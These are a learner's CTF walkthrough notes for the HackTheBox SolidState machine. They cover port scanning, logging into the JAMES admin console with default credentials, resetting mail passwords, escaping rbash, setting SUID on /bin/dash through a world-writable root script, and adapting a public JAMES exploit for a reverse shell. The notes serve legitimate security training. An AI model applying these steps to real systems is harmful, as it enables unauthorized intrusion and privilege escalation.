https://app.hackthebox.com/machines/SolidState

https://www.youtube.com/watch?v=_QapCUx55Xk

```sh
nmap -sC -sV -oA nmap/initial 10.10.10.51
less nmap/initial
# 22,25,80,110,119
```

James SMTP?

```sh
nmap -p- -T5 -oA nmap/allports 10.10.10.51
```

Visit website, try out some endpoints. `robots.txt` `admin`
Nmap is finished by now, new port `4555`.

```sh
grep -oP '\d{1,5}/open' nmap/allports.gnmap
```
```sh
22/open
25/open
...
```
```sh
grep -oP '\d{1,5}/open' nmap/allports.gnmap | sort -u > ports.lst
vim ports.lst
:%s/\/ope//g # replace ope with nothing
:%s/n\n/,/g # replace n\n with ,
:wq #save and quit
cat ports.lst
22,25,...
nmap -p 110,119,22,25,4555,80 -sC -sV -oA nmap/targeted --script vuln 10.10.10.51
```

While scanning, look at `4555`.

```sh
nc 10.10.10.51 4555
admin:admin # fail
root:root # SUCCESS
# think about creating a brute forcer
help
listusers
# look what user is interesting
setpassword mailadmin password
```

Use a mail client to access the server's POP -> `Thunderbird` .
```sh
Name: mailadmin
Email: mailadmin@10.10.10.51
Password: password
Inbox -> Get Messages
```

Nothing interesting in this user's inbox, enumerate all the other users and check their inboxes.
Interesting stuff found in `mindy`'s inbox. Log into ssh with provided creds.

Weird stuff going on in the console, no tab auto complete, cd doesn't work.
Check `/etc/passwd` to see the current user info.
`mindy` is using `/bin/rbash` - restricted bash.
`james` user is using `/bin/bash` , maybe try to escalate to him and from there vertically?

Escape `rbash` with `bash` cmd, opens a `bash` shell as `mindy`.
Serve linenum, download it on target machine and run it.

```sh
cd /dev/shm # RAM disk, nothing we do will be saved on the disk
wget localhost/linenum.sh .
bash linenum.sh # doesn't run the script
bash linenum.sh -t # includes thorough (lengthy) test
```

\*LinEnum showed version `2017-*-*` which indicates kernel exploits probably won't work.

Only interesting thing: `james` user and `/opt/tmp.py` script that is owned by `root` with 777 perms.

```sh
cat /opt/tmp.py
# script that clears tmp directory
# script is editable by anyone, possible to make it run any command, use this to get a reverse shell
```
```sh
# getting reverse shell didn't work, so try it with some other command
# for example, 'touch /tmp/test' and wait for script to be run by root
# confirmed that the script runs
# find another shell (ex. /bin/dash) and change SUID's to gain priv esc
# there is no GCC on the box so this is the easier path
chmod 4755 /bin/dash
date
ls -la /bin/dash # suid bit present
dash
id # euid is root -> obtained root priv
```

#### Exploiting the box with JAMES exploit

```sh
less nmap/initial.nmap
# JAMES 2.3.2
searchsploit james
searchsploit -m exploits/linux/remote/35513.py
vim 35513.py
```

Edit the exploit, payload is set to touch a file, we want a reverse shell -> obtain from pentest monkey Reverse Shell cheat sheet.

The exploit works by adding a user with path traversal and a directory. This happens because JAMES creates a directory for every user. When an email gets sent to the user, a file is created in the directory from username with our payload. When the user logs in to machine, the payload is executed.

Basically this just let us skip escaping `rbash`.

? Box was broken at one point ?

Obtain tty with python.